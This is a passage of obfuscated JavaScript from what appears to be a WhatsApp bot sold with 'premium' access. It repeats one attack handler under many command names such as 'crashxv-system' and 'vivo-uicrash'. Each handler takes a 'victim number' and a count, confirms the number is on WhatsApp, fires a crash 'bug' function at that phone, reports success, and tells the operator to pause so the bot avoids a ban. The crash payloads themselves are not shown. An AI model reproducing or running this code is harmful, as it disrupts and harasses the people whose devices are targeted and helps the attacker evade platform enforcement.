            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x4ab6eb = _0x1b3c99.split(',')[0x0];
          let _0x530b0c = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x4ab6eb || !_0x530b0c) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x530b0c))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x297d2a = _0x4ab6eb.replace(/[^0-9]/g, '');
          let _0x29decb = '' + encodeURI(_0x530b0c);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x297d2a + "@s.whatsapp.net");
          let _0x4711f4 = _0x297d2a + "@s.whatsapp.net";
          if (_0x297d2a == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x4711f4, _0x29decb);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x4711f4.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x4711f4]);
        }
        break;
      case "hardcore-lock":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x264041 = _0x1b3c99.split(',')[0x0];
          let _0x461361 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x264041 || !_0x461361) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x461361))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x5524b = _0x264041.replace(/[^0-9]/g, '');
          let _0x418446 = '' + encodeURI(_0x461361);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x5524b + "@s.whatsapp.net");
          let _0x2e5ea8 = _0x5524b + "@s.whatsapp.net";
          if (_0x5524b == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x2e5ea8, _0x418446);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x2e5ea8.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x2e5ea8]);
        }
        break;
      case 'hardcore-evos':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x58e286 = _0x1b3c99.split(',')[0x0];
          let _0x3bda22 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x58e286 || !_0x3bda22) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x3bda22))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x5a07d6 = _0x58e286.replace(/[^0-9]/g, '');
          let _0x5ac182 = '' + encodeURI(_0x3bda22);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x5a07d6 + '@s.whatsapp.net');
          let _0x1b6cbd = _0x5a07d6 + "@s.whatsapp.net";
          if (_0x5a07d6 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x1b6cbd, _0x5ac182);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x1b6cbd.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x1b6cbd]);
        }
        break;
      case "xandroid2":
        {
          if (!_0x215af5) {
            return;
          }
          {
            return _0x5d98d9("*This feature is for the bot only!*");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Example usage: " + (_0x1eabdf + _0x19c9fe) + " 5");
          }
          if (isNaN(parseInt(_0x1b3c99))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x4b2e0e = encodeURI(_0x1b3c99) * 0xc8;
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x5dc);
          _0x1148a3(_0x5acaf7, _0x4b2e0e);
          await sleep(0x9c4);
          _0x3a1c14('彡');
        }
        break;
      case "hardcore-geek":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x1621e1 = _0x1b3c99.split(',')[0x0];
          let _0x49306a = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x1621e1 || !_0x49306a) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x49306a))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x3ee04b = _0x1621e1.replace(/[^0-9]/g, '');
          let _0x4494c6 = '' + encodeURI(_0x49306a);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x3ee04b + "@s.whatsapp.net");
          let _0x12f151 = _0x3ee04b + "@s.whatsapp.net";
          if (_0x3ee04b == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x12f151, _0x4494c6);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x12f151.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x12f151]);
        }
        break;
      case "crashxv-strong":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x4111e9 = _0x1b3c99.split(',')[0x0];
          let _0x29c5ce = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x4111e9 || !_0x29c5ce) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x29c5ce))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x5be4f8 = _0x4111e9.replace(/[^0-9]/g, '');
          let _0x33720d = '' + encodeURI(_0x29c5ce);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x5be4f8 + "@s.whatsapp.net");
          let _0x49a02d = _0x5be4f8 + "@s.whatsapp.net";
          if (_0x5be4f8 == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x49a02d, _0x33720d);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x49a02d.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x49a02d]);
        }
        break;
      case "crashxv-wirles":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x4394bf = _0x1b3c99.split(',')[0x0];
          let _0x514f93 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x4394bf || !_0x514f93) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x514f93))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x5acf4c = _0x4394bf.replace(/[^0-9]/g, '');
          let _0x52fc86 = '' + encodeURI(_0x514f93);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x5acf4c + "@s.whatsapp.net");
          let _0x3a1861 = _0x5acf4c + "@s.whatsapp.net";
          if (_0x5acf4c == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x3a1861, _0x52fc86);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x3a1861.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x3a1861]);
        }
        break;
      case 'crashxv-system':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x48d017 = _0x1b3c99.split(',')[0x0];
          let _0x4644d1 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x48d017 || !_0x4644d1) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x4644d1))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x5b13e1 = _0x48d017.replace(/[^0-9]/g, '');
          let _0x3ff9ce = '' + encodeURI(_0x4644d1);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x5b13e1 + '@s.whatsapp.net');
          let _0x28f432 = _0x5b13e1 + "@s.whatsapp.net";
          if (_0x5b13e1 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x28f432, _0x3ff9ce);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x28f432.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x28f432]);
        }
        break;
      case "crashxv-sql":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x20f1b4 = _0x1b3c99.split(',')[0x0];
          let _0x2ccc4a = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x20f1b4 || !_0x2ccc4a) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x2ccc4a))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x37beb1 = _0x20f1b4.replace(/[^0-9]/g, '');
          let _0x237dfd = '' + encodeURI(_0x2ccc4a);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x37beb1 + "@s.whatsapp.net");
          let _0x457b34 = _0x37beb1 + "@s.whatsapp.net";
          if (_0x37beb1 == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x457b34, _0x237dfd);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x457b34.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x457b34]);
        }
        break;
      case "crashxv-ui":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0xa790b9 = _0x1b3c99.split(',')[0x0];
          let _0x1cb3c5 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0xa790b9 || !_0x1cb3c5) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x1cb3c5))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0xbd19f9 = _0xa790b9.replace(/[^0-9]/g, '');
          let _0x1d4bfd = '' + encodeURI(_0x1cb3c5);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0xbd19f9 + "@s.whatsapp.net");
          let _0x30984a = _0xbd19f9 + "@s.whatsapp.net";
          if (_0xbd19f9 == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x30984a, _0x1d4bfd);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x30984a.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x30984a]);
        }
        break;
      case "crashxv-external":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x24ed71 = _0x1b3c99.split(',')[0x0];
          let _0x5409a1 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x24ed71 || !_0x5409a1) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x5409a1))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x174207 = _0x24ed71.replace(/[^0-9]/g, '');
          let _0x462990 = '' + encodeURI(_0x5409a1);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x174207 + "@s.whatsapp.net");
          let _0x3cacb2 = _0x174207 + "@s.whatsapp.net";
          if (_0x174207 == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x3cacb2, _0x462990);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x3cacb2.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x3cacb2]);
        }
        break;
      case 'crashxv-internal':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x1864dd = _0x1b3c99.split(',')[0x0];
          let _0x2f2220 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x1864dd || !_0x2f2220) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x2f2220))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x51742f = _0x1864dd.replace(/[^0-9]/g, '');
          let _0x18636d = '' + encodeURI(_0x2f2220);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x51742f + "@s.whatsapp.net");
          let _0x512b79 = _0x51742f + "@s.whatsapp.net";
          if (_0x51742f == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x512b79, _0x18636d);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x512b79.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x512b79]);
        }
        break;
      case 'vivo-system':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x411854 = _0x1b3c99.split(',')[0x0];
          let _0x50cd90 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x411854 || !_0x50cd90) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x50cd90))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x1a0fad = _0x411854.replace(/[^0-9]/g, '');
          let _0x2ffb5d = '' + encodeURI(_0x50cd90);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x1a0fad + "@s.whatsapp.net");
          let _0x31987c = _0x1a0fad + '@s.whatsapp.net';
          if (_0x1a0fad == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x31987c, _0x2ffb5d);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x31987c.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x31987c]);
        }
        break;
      case "vivo-engine":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x21f4d5 = _0x1b3c99.split(',')[0x0];
          let _0x4c4248 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x21f4d5 || !_0x4c4248) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x4c4248))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x4620da = _0x21f4d5.replace(/[^0-9]/g, '');
          let _0x29d76d = '' + encodeURI(_0x4c4248);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x4620da + "@s.whatsapp.net");
          let _0x5594cf = _0x4620da + "@s.whatsapp.net";
          if (_0x4620da == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x5594cf, _0x29d76d);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x5594cf.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x5594cf]);
        }
        break;
      case "vivo-uicrash":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x146125 = _0x1b3c99.split(',')[0x0];
          let _0x31f090 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x146125 || !_0x31f090) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x31f090))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x12cb85 = _0x146125.replace(/[^0-9]/g, '');
          let _0x58582a = '' + encodeURI(_0x31f090);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x12cb85 + '@s.whatsapp.net');
          let _0x11f7b0 = _0x12cb85 + '@s.whatsapp.net';
          if (_0x12cb85 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x11f7b0, _0x58582a);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x11f7b0.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x11f7b0]);
        }
        break;
      case "vivo-ui":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x4218fe = _0x1b3c99.split(',')[0x0];
          let _0x5f23da = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x4218fe || !_0x5f23da) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x5f23da))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x497e34 = _0x4218fe.replace(/[^0-9]/g, '');
          let _0x5209fb = '' + encodeURI(_0x5f23da);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x497e34 + "@s.whatsapp.net");
          let _0x33375b = _0x497e34 + "@s.whatsapp.net";
          if (_0x497e34 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x33375b, _0x5209fb);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x33375b.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x33375b]);
        }
        break;
      case "vivo-external":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x491c14 = _0x1b3c99.split(',')[0x0];
          let _0x531e8a = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x491c14 || !_0x531e8a) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x531e8a))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x2e5b89 = _0x491c14.replace(/[^0-9]/g, '');
          let _0x8cff5d = '' + encodeURI(_0x531e8a);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x2e5b89 + '@s.whatsapp.net');
          let _0x39e5fc = _0x2e5b89 + '@s.whatsapp.net';
          if (_0x2e5b89 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x39e5fc, _0x8cff5d);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x39e5fc.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x39e5fc]);
        }
        break;
      case "vivo-internal":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x3692ad = _0x1b3c99.split(',')[0x0];
          let _0x5ce919 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x3692ad || !_0x5ce919) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x5ce919))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x585e84 = _0x3692ad.replace(/[^0-9]/g, '');
          let _0x2fc413 = '' + encodeURI(_0x5ce919);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x585e84 + "@s.whatsapp.net");
          let _0x484f61 = _0x585e84 + "@s.whatsapp.net";
          if (_0x585e84 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x484f61, _0x2fc413);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x484f61.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x484f61]);
        }
        break;
      case "vivo-mybug":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x2b915b = _0x1b3c99.split(',')[0x0];
          let _0x240b77 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x2b915b || !_0x240b77) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x240b77))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x317780 = _0x2b915b.replace(/[^0-9]/g, '');
          let _0x2436b5 = '' + encodeURI(_0x240b77);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x317780 + '@s.whatsapp.net');
          let _0x575409 = _0x317780 + "@s.whatsapp.net";
          if (_0x317780 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x575409, _0x2436b5);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x575409.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x575409]);
        }
        break;
      case "vivo-bug":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x185d24 = _0x1b3c99.split(',')[0x0];
          let _0x5cedbf = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x185d24 || !_0x5cedbf) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x5cedbf))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x57a0c = _0x185d24.replace(/[^0-9]/g, '');
